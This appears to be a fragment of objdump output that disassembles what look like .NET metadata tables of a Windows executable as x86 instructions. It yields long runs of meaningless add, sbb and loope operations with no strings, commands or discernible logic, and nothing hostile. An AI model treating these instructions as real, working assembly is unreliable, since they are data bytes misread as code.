  40649b:	00 83 00 29 01 06    	add    %al,0x6012900(%ebx)
  4064a1:	00 52 00             	add    %dl,0x0(%edx)
  4064a4:	90                   	nop
  4064a5:	44                   	inc    %esp
  4064a6:	00 00                	add    %al,(%eax)
  4064a8:	00 00                	add    %al,(%eax)
  4064aa:	86 18                	xchg   %bl,(%eax)
  4064ac:	bf 15 06 00 52       	mov    $0x52000615,%edi
  4064b1:	00 98 44 00 00 00    	add    %bl,0x44(%eax)
  4064b7:	00 86 18 bf 15 06    	add    %al,0x615bf18(%esi)
  4064bd:	00 52 00             	add    %dl,0x0(%edx)
  4064c0:	a0 44 00 00 00       	mov    0x44,%al
  4064c5:	00 83 00 ea 01 1c    	add    %al,0x1c01ea00(%ebx)
  4064cb:	03 52 00             	add    0x0(%edx),%edx
  4064ce:	e4 44                	in     $0x44,%al
  4064d0:	00 00                	add    %al,(%eax)
  4064d2:	00 00                	add    %al,(%eax)
  4064d4:	e1 01                	loope  0x4064d7
  4064d6:	08 1d 06 00 52 00    	or     %bl,0x520006
  4064dc:	ac                   	lods   %ds:(%esi),%al
  4064dd:	47                   	inc    %edi
  4064de:	00 00                	add    %al,(%eax)
  4064e0:	00 00                	add    %al,(%eax)
  4064e2:	e1 01                	loope  0x4064e5
  4064e4:	8d 0a                	lea    (%edx),%ecx
  4064e6:	27                   	daa
  4064e7:	00 52 00             	add    %dl,0x0(%edx)
  4064ea:	bc 47 00 00 00       	mov    $0x47,%esp
  4064ef:	00 e1                	add    %ah,%cl
  4064f1:	01 08                	add    %ecx,(%eax)
  4064f3:	1d 06 00 53 00       	sbb    $0x530006,%eax
  4064f8:	90                   	nop
  4064f9:	48                   	dec    %eax
  4064fa:	00 00                	add    %al,(%eax)
  4064fc:	00 00                	add    %al,(%eax)
  4064fe:	e1 01                	loope  0x406501
  406500:	8d 0a                	lea    (%edx),%ecx
  406502:	27                   	daa
  406503:	00 53 00             	add    %dl,0x0(%ebx)
  406506:	9e                   	sahf
  406507:	48                   	dec    %eax
  406508:	00 00                	add    %al,(%eax)
  40650a:	00 00                	add    %al,(%eax)
  40650c:	91                   	xchg   %eax,%ecx
  40650d:	18 c5                	sbb    %al,%ch
  40650f:	15 c3 04 54 00       	adc    $0x5404c3,%eax
  406514:	aa                   	stos   %al,%es:(%edi)
  406515:	48                   	dec    %eax
  406516:	00 00                	add    %al,(%eax)
  406518:	00 00                	add    %al,(%eax)
  40651a:	86 18                	xchg   %bl,(%eax)
  40651c:	bf 15 06 00 54       	mov    $0x54000615,%edi
  406521:	00 b4 48 00 00 00 00 	add    %dh,0x0(%eax,%ecx,2)
  406528:	83 00 2e             	addl   $0x2e,(%eax)
  40652b:	00 06                	add    %al,(%esi)
  40652d:	00 54 00 38          	add    %dl,0x38(%eax,%eax,1)
  406531:	49                   	dec    %ecx
  406532:	00 00                	add    %al,(%eax)
  406534:	00 00                	add    %al,(%eax)
  406536:	e1 01                	loope  0x406539
  406538:	08 1d 06 00 54 00    	or     %bl,0x540006
  40653e:	88 4a 00             	mov    %cl,0x0(%edx)
  406541:	00 00                	add    %al,(%eax)
  406543:	00 e1                	add    %ah,%cl
  406545:	01 8d 0a 27 00 54    	add    %ecx,0x5400270a(%ebp)
  40654b:	00 96 4a 00 00 00    	add    %dl,0x4a(%esi)
  406551:	00 91 18 c5 15 c3    	add    %dl,-0x3cea3ae8(%ecx)
  406557:	04 55                	add    $0x55,%al
  406559:	00 a2 4a 00 00 00    	add    %ah,0x4a(%edx)
  40655f:	00 86 18 bf 15 06    	add    %al,0x615bf18(%esi)
  406565:	00 55 00             	add    %dl,0x0(%ebp)
  406568:	ac                   	lods   %ds:(%esi),%al
  406569:	4a                   	dec    %edx
  40656a:	00 00                	add    %al,(%eax)
  40656c:	00 00                	add    %al,(%eax)
  40656e:	83 00 20             	addl   $0x20,(%eax)
  406571:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  406574:	55                   	push   %ebp
  406575:	00 e8                	add    %ch,%al
  406577:	4a                   	dec    %edx
  406578:	00 00                	add    %al,(%eax)
  40657a:	00 00                	add    %al,(%eax)
  40657c:	e1 01                	loope  0x40657f
  40657e:	08 1d 06 00 55 00    	or     %bl,0x550006
  406584:	74 4c                	je     0x4065d2
  406586:	00 00                	add    %al,(%eax)
  406588:	00 00                	add    %al,(%eax)
  40658a:	e1 01                	loope  0x40658d
  40658c:	8d 0a                	lea    (%edx),%ecx
  40658e:	27                   	daa
  40658f:	00 55 00             	add    %dl,0x0(%ebp)
  406592:	82 4c 00 00 00       	orb    $0x0,0x0(%eax,%eax,1)
  406597:	00 91 18 c5 15 c3    	add    %dl,-0x3cea3ae8(%ecx)
  40659d:	04 56                	add    $0x56,%al
  40659f:	00 8e 4c 00 00 00    	add    %cl,0x4c(%esi)
  4065a5:	00 86 18 bf 15 06    	add    %al,0x615bf18(%esi)
  4065ab:	00 56 00             	add    %dl,0x0(%esi)
  4065ae:	98                   	cwtl
  4065af:	4c                   	dec    %esp
  4065b0:	00 00                	add    %al,(%eax)
  4065b2:	00 00                	add    %al,(%eax)
  4065b4:	83 00 5a             	addl   $0x5a,(%eax)
  4065b7:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  4065ba:	56                   	push   %esi
  4065bb:	00 d3                	add    %dl,%bl
  4065bd:	4c                   	dec    %esp
  4065be:	00 00                	add    %al,(%eax)
  4065c0:	00 00                	add    %al,(%eax)
  4065c2:	86 18                	xchg   %bl,(%eax)
  4065c4:	bf 15 06 00 56       	mov    $0x56000615,%edi
  4065c9:	00 db                	add    %bl,%bl
  4065cb:	4c                   	dec    %esp
  4065cc:	00 00                	add    %al,(%eax)
  4065ce:	00 00                	add    %al,(%eax)
  4065d0:	83 00 13             	addl   $0x13,(%eax)
  4065d3:	01 06                	add    %eax,(%esi)
  4065d5:	00 56 00             	add    %dl,0x0(%esi)
  4065d8:	f0 4c                	lock dec %esp
  4065da:	00 00                	add    %al,(%eax)
  4065dc:	00 00                	add    %al,(%eax)
  4065de:	e1 01                	loope  0x4065e1
  4065e0:	08 1d 06 00 56 00    	or     %bl,0x560006
  4065e6:	68 4e 00 00 00       	push   $0x4e
  4065eb:	00 e1                	add    %ah,%cl
  4065ed:	01 8d 0a 27 00 56    	add    %ecx,0x5600270a(%ebp)
  4065f3:	00 78 4e             	add    %bh,0x4e(%eax)
  4065f6:	00 00                	add    %al,(%eax)
  4065f8:	00 00                	add    %al,(%eax)
  4065fa:	e1 01                	loope  0x4065fd
  4065fc:	08 1d 06 00 57 00    	or     %bl,0x570006
  406602:	a8 51                	test   $0x51,%al
  406604:	00 00                	add    %al,(%eax)
  406606:	00 00                	add    %al,(%eax)
  406608:	e1 01                	loope  0x40660b
  40660a:	8d 0a                	lea    (%edx),%ecx
  40660c:	27                   	daa
  40660d:	00 57 00             	add    %dl,0x0(%edi)
  406610:	b8 51 00 00 00       	mov    $0x51,%eax
  406615:	00 e1                	add    %ah,%cl
  406617:	01 08                	add    %ecx,(%eax)
  406619:	1d 06 00 58 00       	sbb    $0x580006,%eax
  40661e:	34 54                	xor    $0x54,%al
  406620:	00 00                	add    %al,(%eax)
  406622:	00 00                	add    %al,(%eax)
  406624:	e1 01                	loope  0x406627
  406626:	8d 0a                	lea    (%edx),%ecx
  406628:	27                   	daa
  406629:	00 58 00             	add    %bl,0x0(%eax)
  40662c:	44                   	inc    %esp
  40662d:	54                   	push   %esp
  40662e:	00 00                	add    %al,(%eax)
  406630:	00 00                	add    %al,(%eax)
  406632:	e1 01                	loope  0x406635
  406634:	08 1d 06 00 59 00    	or     %bl,0x590006
  40663a:	b8 55 00 00 00       	mov    $0x55,%eax
  40663f:	00 e1                	add    %ah,%cl
  406641:	01 8d 0a 27 00 59    	add    %ecx,0x5900270a(%ebp)
  406647:	00 00                	add    %al,(%eax)
  406649:	00 01                	add    %al,(%ecx)
  40664b:	00 d3                	add    %dl,%bl
  40664d:	08 00                	or     %al,(%eax)
  40664f:	00 02                	add    %al,(%edx)
  406651:	00 1b                	add    %bl,(%ebx)
  406653:	09 00                	or     %eax,(%eax)
  406655:	00 01                	add    %al,(%ecx)
  406657:	00 72 09             	add    %dh,0x9(%edx)
  40665a:	00 00                	add    %al,(%eax)
  40665c:	01 00                	add    %eax,(%eax)
  40665e:	4e                   	dec    %esi
  40665f:	1a 00                	sbb    (%eax),%al
  406661:	00 02                	add    %al,(%edx)
  406663:	00 24 0e             	add    %ah,(%esi,%ecx,1)
  406666:	00 00                	add    %al,(%eax)
  406668:	03 00                	add    (%eax),%eax
  40666a:	21 1b                	and    %ebx,(%ebx)
  40666c:	02 00                	add    (%eax),%al
  40666e:	04 00                	add    $0x0,%al
  406670:	f9                   	stc
  406671:	1a 00                	sbb    (%eax),%al
  406673:	00 01                	add    %al,(%ecx)
  406675:	00 b7 19 00 00 02    	add    %dh,0x2000019(%edi)
  40667b:	00 97 08 00 00 03    	add    %dl,0x3000008(%edi)
  406681:	00 01                	add    %al,(%ecx)
  406683:	06                   	push   %es
  406684:	00 00                	add    %al,(%eax)
  406686:	01 00                	add    %eax,(%eax)
  406688:	c5 19                	lds    (%ecx),%ebx
  40668a:	00 00                	add    %al,(%eax)
  40668c:	02 00                	add    (%eax),%al
  40668e:	4e                   	dec    %esi
  40668f:	1a 00                	sbb    (%eax),%al
  406691:	00 03                	add    %al,(%ebx)
  406693:	00 24 0e             	add    %ah,(%esi,%ecx,1)
  406696:	00 00                	add    %al,(%eax)
  406698:	04 00                	add    $0x0,%al
  40669a:	f1                   	int1
  40669b:	0a 00                	or     (%eax),%al
  40669d:	00 05 00 17 1b 00    	add    %al,0x1b1700
  4066a3:	00 01                	add    %al,(%ecx)
  4066a5:	00 c5                	add    %al,%ch
  4066a7:	19 00                	sbb    %eax,(%eax)
  4066a9:	00 02                	add    %al,(%edx)
  4066ab:	00 2d 1a 00 00 03    	add    %ch,0x300001a
  4066b1:	00 29                	add    %ch,(%ecx)
  4066b3:	14 00                	adc    $0x0,%al
  4066b5:	00 04 00             	add    %al,(%eax,%eax,1)
  4066b8:	2b 0e                	sub    (%esi),%ecx
  4066ba:	02 00                	add    (%eax),%al
  4066bc:	05 00 cf 11 00       	add    $0x11cf00,%eax
  4066c1:	00 01                	add    %al,(%ecx)
  4066c3:	00 c5                	add    %al,%ch
  4066c5:	19 00                	sbb    %eax,(%eax)
  4066c7:	00 02                	add    %al,(%edx)
  4066c9:	00 45 17             	add    %al,0x17(%ebp)
  4066cc:	00 00                	add    %al,(%eax)
  4066ce:	03 00                	add    (%eax),%eax
  4066d0:	18 0e                	sbb    %cl,(%esi)
  4066d2:	00 00                	add    %al,(%eax)
  4066d4:	04 00                	add    $0x0,%al
  4066d6:	58                   	pop    %eax
  4066d7:	1a 00                	sbb    (%eax),%al
  4066d9:	00 05 00 cb 14 00    	add    %al,0x14cb00
  4066df:	00 06                	add    %al,(%esi)
  4066e1:	00 ca                	add    %cl,%dl
  4066e3:	17                   	pop    %ss
  4066e4:	02 00                	add    (%eax),%al
  4066e6:	07                   	pop    %es
  4066e7:	00 f6                	add    %dh,%dh
  4066e9:	05 00 00 01 00       	add    $0x10000,%eax
  4066ee:	ca 1a 00             	lret   $0x1a
  4066f1:	00 01                	add    %al,(%ecx)
  4066f3:	00 93 1d 00 00 01    	add    %dl,0x100001d(%ebx)
  4066f9:	00 a4 09 00 00 02 00 	add    %ah,0x20000(%ecx,%ecx,1)
  406700:	3a 06                	cmp    (%esi),%al
  406702:	00 00                	add    %al,(%eax)
  406704:	01 00                	add    %eax,(%eax)
  406706:	da 17                	ficoml (%edi)
  406708:	00 00                	add    %al,(%eax)
  40670a:	01 00                	add    %eax,(%eax)
  40670c:	67 09 00             	or     %eax,(%bx,%si)
  40670f:	00 01                	add    %al,(%ecx)
  406711:	00 d3                	add    %dl,%bl
  406713:	08 00                	or     %al,(%eax)
  406715:	00 02                	add    %al,(%edx)
  406717:	00 1b                	add    %bl,(%ebx)
  406719:	09 00                	or     %eax,(%eax)
  40671b:	00 01                	add    %al,(%ecx)
  40671d:	00 4e 1a             	add    %cl,0x1a(%esi)
  406720:	00 00                	add    %al,(%eax)
  406722:	02 00                	add    (%eax),%al
  406724:	24 0e                	and    $0xe,%al
  406726:	00 00                	add    %al,(%eax)
  406728:	03 00                	add    (%eax),%eax
  40672a:	21 1b                	and    %ebx,(%ebx)
  40672c:	02 00                	add    (%eax),%al
  40672e:	04 00                	add    $0x0,%al
  406730:	f9                   	stc
  406731:	1a 00                	sbb    (%eax),%al
  406733:	00 01                	add    %al,(%ecx)
  406735:	00 d3                	add    %dl,%bl
  406737:	08 00                	or     %al,(%eax)
  406739:	00 02                	add    %al,(%edx)
  40673b:	00 1b                	add    %bl,(%ebx)
  40673d:	09 00                	or     %eax,(%eax)
  40673f:	00 01                	add    %al,(%ecx)
  406741:	00 72 09             	add    %dh,0x9(%edx)
  406744:	00 00                	add    %al,(%eax)
  406746:	01 00                	add    %eax,(%eax)
  406748:	4e                   	dec    %esi
  406749:	1a 00                	sbb    (%eax),%al
  40674b:	00 02                	add    %al,(%edx)
  40674d:	00 24 0e             	add    %ah,(%esi,%ecx,1)
  406750:	00 00                	add    %al,(%eax)
  406752:	03 00                	add    (%eax),%eax
  406754:	21 1b                	and    %ebx,(%ebx)
  406756:	02 00                	add    (%eax),%al
  406758:	04 00                	add    $0x0,%al
  40675a:	f9                   	stc
  40675b:	1a 00                	sbb    (%eax),%al
  40675d:	00 01                	add    %al,(%ecx)
  40675f:	00 6f 0f             	add    %ch,0xf(%edi)
  406762:	00 00                	add    %al,(%eax)
  406764:	01 00                	add    %eax,(%eax)
  406766:	47                   	inc    %edi
  406767:	10 00                	adc    %al,(%eax)
  406769:	00 02                	add    %al,(%edx)
  40676b:	00 0b                	add    %cl,(%ebx)
  40676d:	05 00 00 03 00       	add    $0x30000,%eax
  406772:	df 06                	filds  (%esi)
  406774:	00 00                	add    %al,(%eax)
  406776:	01 00                	add    %eax,(%eax)
  406778:	31 07                	xor    %eax,(%edi)
  40677a:	00 00                	add    %al,(%eax)
  40677c:	01 00                	add    %eax,(%eax)
  40677e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40677f:	0f 00 00             	sldt   (%eax)
  406782:	02 00                	add    (%eax),%al
  406784:	ff 0d 00 00 01 00    	decl   0x10000
  40678a:	b4 13                	mov    $0x13,%ah
  40678c:	00 00                	add    %al,(%eax)
  40678e:	01 00                	add    %eax,(%eax)
  406790:	b7 11                	mov    $0x11,%bh
  406792:	00 00                	add    %al,(%eax)
  406794:	01 00                	add    %eax,(%eax)
  406796:	31 07                	xor    %eax,(%edi)
  406798:	00 00                	add    %al,(%eax)
  40679a:	01 00                	add    %eax,(%eax)
  40679c:	b4 13                	mov    $0x13,%ah
  40679e:	00 00                	add    %al,(%eax)
  4067a0:	01 00                	add    %eax,(%eax)
  4067a2:	73 1c                	jae    0x4067c0
  4067a4:	00 00                	add    %al,(%eax)
  4067a6:	02 00                	add    (%eax),%al
  4067a8:	3e 1c 00             	ds sbb $0x0,%al
  4067ab:	00 03                	add    %al,(%ebx)
  4067ad:	00 d2                	add    %dl,%dl
  4067af:	1c 00                	sbb    $0x0,%al
  4067b1:	00 01                	add    %al,(%ecx)
  4067b3:	00 d6                	add    %dl,%dh
  4067b5:	0f 00 00             	sldt   (%eax)
  4067b8:	01 00                	add    %eax,(%eax)
  4067ba:	b4 13                	mov    $0x13,%ah
  4067bc:	00 00                	add    %al,(%eax)
  4067be:	02 00                	add    (%eax),%al
  4067c0:	4f                   	dec    %edi
  4067c1:	0f 00 00             	sldt   (%eax)
  4067c4:	01 00                	add    %eax,(%eax)
  4067c6:	b0 0f                	mov    $0xf,%al
  4067c8:	00 00                	add    %al,(%eax)
  4067ca:	01 00                	add    %eax,(%eax)
  4067cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4067cd:	0f 00 00             	sldt   (%eax)
  4067d0:	01 00                	add    %eax,(%eax)
  4067d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4067d3:	0f 00 00             	sldt   (%eax)
  4067d6:	01 00                	add    %eax,(%eax)
  4067d8:	ca 0f 00             	lret   $0xf
  4067db:	00 01                	add    %al,(%ecx)
  4067dd:	00 5d 02             	add    %bl,0x2(%ebp)
  4067e0:	00 00                	add    %al,(%eax)
  4067e2:	02 00                	add    (%eax),%al
  4067e4:	fa                   	cli
  4067e5:	02 00                	add    (%eax),%al
  4067e7:	00 01                	add    %al,(%ecx)
  4067e9:	00 19                	add    %bl,(%ecx)
  4067eb:	08 00                	or     %al,(%eax)
  4067ed:	00 01                	add    %al,(%ecx)
  4067ef:	00 e6                	add    %ah,%dh
  4067f1:	0f 00 00             	sldt   (%eax)
  4067f4:	01 00                	add    %eax,(%eax)
  4067f6:	19 08                	sbb    %ecx,(%eax)
  4067f8:	00 00                	add    %al,(%eax)
  4067fa:	01 00                	add    %eax,(%eax)
  4067fc:	77 0f                	ja     0x40680d
  4067fe:	00 00                	add    %al,(%eax)
  406800:	02 00                	add    (%eax),%al
  406802:	b0 0f                	mov    $0xf,%al
  406804:	00 00                	add    %al,(%eax)
  406806:	03 00                	add    (%eax),%eax
  406808:	14 15                	adc    $0x15,%al
  40680a:	00 00                	add    %al,(%eax)
  40680c:	01 00                	add    %eax,(%eax)
  40680e:	fd                   	std
  40680f:	0f 00 00             	sldt   (%eax)
  406812:	01 00                	add    %eax,(%eax)
  406814:	97                   	xchg   %eax,%edi
  406815:	1d 00 00 01 00       	sbb    $0x10000,%eax
  40681a:	7f 09                	jg     0x406825
  40681c:	00 00                	add    %al,(%eax)
  40681e:	01 00                	add    %eax,(%eax)
  406820:	ab                   	stos   %eax,%es:(%edi)
  406821:	05 00 00 01 00       	add    $0x10000,%eax
  406826:	83 11 00             	adcl   $0x0,(%ecx)
  406829:	00 01                	add    %al,(%ecx)
  40682b:	00 83 11 00 00 01    	add    %al,0x1000011(%ebx)
  406831:	00 9d 0a 00 00 01    	add    %bl,0x100000a(%ebp)
  406837:	00 9d 0a 00 00 01    	add    %bl,0x100000a(%ebp)
  40683d:	00 9d 0a 00 00 01    	add    %bl,0x100000a(%ebp)
  406843:	00 9d 0a 00 00 01    	add    %bl,0x100000a(%ebp)
  406849:	00 9d 0a 00 00 01    	add    %bl,0x100000a(%ebp)
  40684f:	00 9d 0a 00 00 01    	add    %bl,0x100000a(%ebp)
  406855:	00 9d 0a 00 00 01    	add    %bl,0x100000a(%ebp)
  40685b:	00 9d 0a 22 00 e5    	add    %bl,-0x1affddf6(%ebp)
  406861:	00 23                	add    %ah,(%ebx)
  406863:	00 e5                	add    %ah,%ch
  406865:	00 25 00 e5 00 27    	add    %ah,0x2700e500
  40686b:	00 e5                	add    %ah,%ch
  40686d:	00 2a                	add    %ch,(%edx)
  40686f:	00 e5                	add    %ah,%ch
  406871:	00 2d 00 e5 00 2e    	add    %ch,0x2e00e500
  406877:	00 e5                	add    %ah,%ch
  406879:	00 2f                	add    %ch,(%edi)
  40687b:	00 e5                	add    %ah,%ch
  40687d:	00 09                	add    %cl,(%ecx)
  40687f:	00 bf 15 01 00 11    	add    %bh,0x11000115(%edi)
  406885:	00 bf 15 06 00 19    	add    %bh,0x19000615(%edi)
  40688b:	00 bf 15 0a 00 29    	add    %bh,0x29000a15(%edi)
  406891:	00 bf 15 10 00 31    	add    %bh,0x31001015(%edi)
  406897:	00 bf 15 10 00 39    	add    %bh,0x39001015(%edi)
  40689d:	00 bf 15 10 00 41    	add    %bh,0x41001015(%edi)
  4068a3:	00 bf 15 10 00 49    	add    %bh,0x49001015(%edi)
  4068a9:	00 bf 15 10 00 51    	add    %bh,0x51001015(%edi)
  4068af:	00 bf 15 10 00 59    	add    %bh,0x59001015(%edi)
  4068b5:	00 bf 15 10 00 61    	add    %bh,0x61001015(%edi)
  4068bb:	00 bf 15 15 00 69    	add    %bh,0x69001515(%edi)
  4068c1:	00 bf 15 10 00 71    	add    %bh,0x71001015(%edi)
  4068c7:	00 bf 15 10 00 79    	add    %bh,0x79001015(%edi)
  4068cd:	00 bf 15 10 00 89    	add    %bh,-0x76ffefeb(%edi)
  4068d3:	00 bf 15 1a 00 91    	add    %bh,-0x6effe5eb(%edi)
  4068d9:	00 bf 15 06 00 c1    	add    %bh,-0x3efff9eb(%edi)
  4068df:	00 bf 15 06 00 31    	add    %bh,0x31000615(%edi)
  4068e5:	01 bf 15 20 00 c9    	add    %edi,-0x36ffdfeb(%edi)
  4068eb:	01 08                	add    %ecx,(%eax)
  4068ed:	1d 06 00 c9 01       	sbb    $0x1c90006,%eax
  4068f2:	8d 0a                	lea    (%edx),%ecx
  4068f4:	27                   	daa
  4068f5:	00 e1                	add    %ah,%cl
  4068f7:	01 bf 15 06 00 f1    	add    %edi,-0xefff9eb(%edi)
  4068fd:	01 bf 15 06 00 31    	add    %edi,0x31000615(%edi)
  406903:	02 aa 0a 2e 00 a1    	add    -0x5effd1f6(%edx),%ch
  406909:	00 e3                	add    %ah,%bl
  40690b:	1d 32 00 a1 00       	sbb    $0xa10032,%eax
  406910:	e2 0d                	loop   0x40691f
  406912:	38 00                	cmp    %al,(%eax)
  406914:	a1 00 6e 0b 06       	mov    0x60b6e00,%eax
  406919:	00 49 02             	add    %cl,0x2(%ecx)
  40691c:	bf 15 06 00 49       	mov    $0x49000615,%edi
  406921:	02 31                	add    (%ecx),%dh
  406923:	09 10                	or     %edx,(%eax)
  406925:	00 49 02             	add    %cl,0x2(%ecx)
  406928:	7e 1a                	jle    0x406944
  40692a:	10 00                	adc    %al,(%eax)
  40692c:	49                   	dec    %ecx
  40692d:	02 65 1d             	add    0x1d(%ebp),%ah
  406930:	15 00 49 02 b2       	adc    $0xb2024900,%eax
  406935:	0d 15 00 c9 00       	or     $0xc90015,%eax
  40693a:	21 1c 41             	and    %ebx,(%ecx,%eax,2)
  40693d:	00 51 02             	add    %dl,0x2(%ecx)
  406940:	7d 1b                	jge    0x40695d
  406942:	50                   	push   %eax
  406943:	00 61 02             	add    %ah,0x2(%ecx)
  406946:	c7                   	(bad)
  406947:	1d 55 00 79 02       	sbb    $0x2790055,%eax
  40694c:	31 1e                	xor    %ebx,(%esi)
  40694e:	5f                   	pop    %edi
  40694f:	00 81 02 8c 1a 68    	add    %al,0x681a8c02(%ecx)
  406955:	00 c9                	add    %cl,%cl
  406957:	00 21                	add    %ah,(%ecx)
  406959:	1c 7c                	sbb    $0x7c,%al
  40695b:	00 31                	add    %dh,(%ecx)
  40695d:	02 bf 14 2e 00 a1    	add    -0x5effd1ec(%edi),%bh
  406963:	00 f0                	add    %dh,%al
  406965:	1d 83 00 a1 00       	sbb    $0xa10083,%eax
  40696a:	08 17                	or     %dl,(%edi)
  40696c:	8a 00                	mov    (%eax),%al
  40696e:	a1 00 cd 0d 8f       	mov    0x8f0dcd00,%eax
  406973:	00 89 02 97 0f 95    	add    %cl,-0x6af068fe(%ecx)
  406979:	00 99 02 72 0a 9c    	add    %bl,-0x63f58dfe(%ecx)
  40697f:	00 a1 02 8c 1a 68    	add    %ah,0x681a8c02(%ecx)
  406985:	00 a1 02 8e 0b a2    	add    %ah,-0x5df471fe(%ecx)
  40698b:	00 89 02 8b 17 a8    	add    %cl,-0x57e874fe(%ecx)
  406991:	00 a1 02 ff 16 ad    	add    %ah,-0x52e900fe(%ecx)
  406997:	00 81 02 8e 0b b7    	add    %al,-0x48f471fe(%ecx)
  40699d:	00 c9                	add    %cl,%cl
  40699f:	00 ea                	add    %ch,%dl
  4069a1:	19 bc 00 c9 00 db 08 	sbb    %edi,0x8db00c9(%eax,%eax,1)
  4069a8:	c1 00 b1             	roll   $0xb1,(%eax)
  4069ab:	02 24 09             	add    (%ecx,%ecx,1),%ah
  4069ae:	c7 00 b9 02 a7 1a    	movl   $0x1aa702b9,(%eax)
  4069b4:	cb                   	lret
  4069b5:	00 b9 00 bf 15 d2    	add    %bh,-0x2dea4100(%ecx)
  4069bb:	00 c1                	add    %al,%cl
  4069bd:	02 bf 15 d8 00 c1    	add    -0x3eff27eb(%edi),%bh
  4069c3:	02 54 07 15          	add    0x15(%edi,%eax,1),%dl
  4069c7:	00 c1                	add    %al,%cl
  4069c9:	02 21                	add    (%ecx),%ah
  4069cb:	1c 06                	sbb    $0x6,%al
  4069cd:	00 a9 00 0c 1d e9    	add    %ch,-0x16e2f400(%ecx)
  4069d3:	00 c1                	add    %al,%cl
  4069d5:	02 ae 13 ef 00 b1    	add    -0x4eff10ed(%esi),%ch
  4069db:	00 52 1d             	add    %dl,0x1d(%edx)
  4069de:	f4                   	hlt
  4069df:	00 b1 00 fb 15 f9    	add    %dh,-0x6ea0500(%ecx)
  4069e5:	00 89 02 08 1c ff    	add    %cl,-0xe3f7fe(%ecx)
  4069eb:	00 b1 00 86 11 03    	add    %dh,0x3118600(%ecx)
  4069f1:	01 a9 00 bf 15 06    	add    %ebp,0x615bf00(%ecx)
  4069f7:	00 c9                	add    %cl,%cl
  4069f9:	02 98 07 cb 00 b9    	add    -0x46ff34f9(%eax),%bl
  4069ff:	02 db                	add    %bl,%bl
  406a01:	0f 11 01             	movups %xmm0,(%ecx)
  406a04:	b9 02 f4 0e 15       	mov    $0x150ef402,%ecx
  406a09:	01 d1                	add    %edx,%ecx
  406a0b:	02 c6                	add    %dh,%al
  406a0d:	0d 1b 01 c9 00       	or     $0xc9011b,%eax
  406a12:	21 1c 2b             	and    %ebx,(%ebx,%ebp,1)
  406a15:	01 c9                	add    %ecx,%ecx
  406a17:	00 57 08             	add    %dl,0x8(%edi)
  406a1a:	31 01                	xor    %eax,(%ecx)
  406a1c:	c9                   	leave
  406a1d:	00 ef                	add    %ch,%bh
  406a1f:	05 11 01 d9 02       	add    $0x2d90111,%eax
  406a24:	a9 13 35 01 d9       	test   $0xd9013513,%eax
  406a29:	02 b0 1e 38 01 d9    	add    -0x26fec7e2(%eax),%dh
  406a2f:	02 bc 02 11 01 99 00 	add    0x990111(%edx,%eax,1),%bh
  406a36:	bf 15 06 00 89       	mov    $0x89000615,%edi
  406a3b:	02 62 1e             	add    0x1e(%edx),%ah
  406a3e:	4a                   	dec    %edx
  406a3f:	01 81 02 75 17 4e    	add    %eax,0x4e177502(%ecx)
  406a45:	01 a9 01 bf 15 10    	add    %ebp,0x1015bf01(%ecx)
  406a4b:	00 a9 01 f1 1a 06    	add    %ch,0x61af101(%ecx)
  406a51:	00 e1                	add    %ah,%cl
  406a53:	02 bf 15 10 00 b1    	add    -0x4effefeb(%edi),%bh
  406a59:	01 bf 15 5c 01 b1    	add    %edi,-0x4efea3eb(%edi)
  406a5f:	01 b3 07 69 01 09    	add    %esi,0x9016907(%ebx)
  406a65:	01 53 11             	add    %edx,0x11(%ebx)
  406a68:	6e                   	outsb  %ds:(%esi),(%dx)
  406a69:	01 d9                	add    %ebx,%ecx
  406a6b:	00 78 1c             	add    %bh,0x1c(%eax)
  406a6e:	74 01                	je     0x406a71
  406a70:	d9 00                	flds   (%eax)
  406a72:	20 0f                	and    %cl,(%edi)
  406a74:	74 01                	je     0x406a77
  406a76:	e1 02                	loope  0x406a7a
  406a78:	5e                   	pop    %esi
  406a79:	0f c7                	(bad)
  406a7b:	00 e1                	add    %ah,%cl
  406a7d:	00 bf 15 06 00 e1    	add    %bh,-0x1efff9eb(%edi)
  406a83:	00 a6 17 7e 01 f1    	add    %ah,-0xefe81e9(%esi)
  406a89:	02 42 06             	add    0x6(%edx),%al
  406a8c:	10 00                	adc    %al,(%eax)
  406a8e:	e1 00                	loope  0x406a90
  406a90:	21 1c 06             	and    %ebx,(%esi,%eax,1)
  406a93:	00 e1                	add    %ah,%cl
  406a95:	00 3e                	add    %bh,(%esi)
  406a97:	1d 8d 01 f9 02       	sbb    $0x2f9018d,%eax
  406a9c:	43                   	inc    %ebx
  406a9d:	1c 93                	sbb    $0x93,%al
  406a9f:	01 f9                	add    %edi,%ecx
  406aa1:	02 4c 0b 98          	add    -0x68(%ebx,%ecx,1),%cl
  406aa5:	01 e9                	add    %ebp,%ecx
  406aa7:	00 e4                	add    %ah,%ah
  406aa9:	0e                   	push   %cs
  406aaa:	9e                   	sahf
  406aab:	01 09                	add    %ecx,(%ecx)
  406aad:	03 4a 11             	add    0x11(%edx),%ecx
  406ab0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406ab1:	01 b9 02 dc 1e 68    	add    %edi,0x681edc02(%ecx)
  406ab7:	00 11                	add    %dl,(%ecx)
  406ab9:	03 c7                	add    %edi,%eax
  406abb:	03 a9 01 11 03 82    	add    -0x7dfceeff(%ecx),%ebp
  406ac1:	17                   	pop    %ss
  406ac2:	af                   	scas   %es:(%edi),%eax
  406ac3:	01 01                	add    %eax,(%ecx)
  406ac5:	03 0d 0b 10 00 01    	add    0x100100b,%ecx
  406acb:	03 31                	add    (%ecx),%esi
  406acd:	11 b5 01 19 03 a0    	adc    %esi,-0x5ffce6ff(%ebp)
  406ad3:	0b bb 01 19 03 6e    	or     0x6e031901(%ebx),%edi
  406ad9:	0b 06                	or     (%esi),%eax
  406adb:	00 c9                	add    %cl,%cl
  406add:	00 bf 15 06 00 c9    	add    %bh,-0x36fff9eb(%edi)
  406ae3:	00 7c 13 ca          	add    %bh,-0x36(%ebx,%edx,1)
  406ae7:	01 b9 02 a7 1a 9c    	add    %edi,-0x63e558fe(%ecx)
  406aed:	00 49 02             	add    %cl,0x2(%ecx)
  406af0:	ed                   	in     (%dx),%eax
  406af1:	1c 15                	sbb    $0x15,%al
  406af3:	00 c9                	add    %cl,%cl
  406af5:	00 21                	add    %ah,(%ecx)
  406af7:	1c 31                	sbb    $0x31,%al
  406af9:	01 c9                	add    %ecx,%ecx
  406afb:	00 da                	add    %bl,%dl
  406afd:	1c d0                	sbb    $0xd0,%al
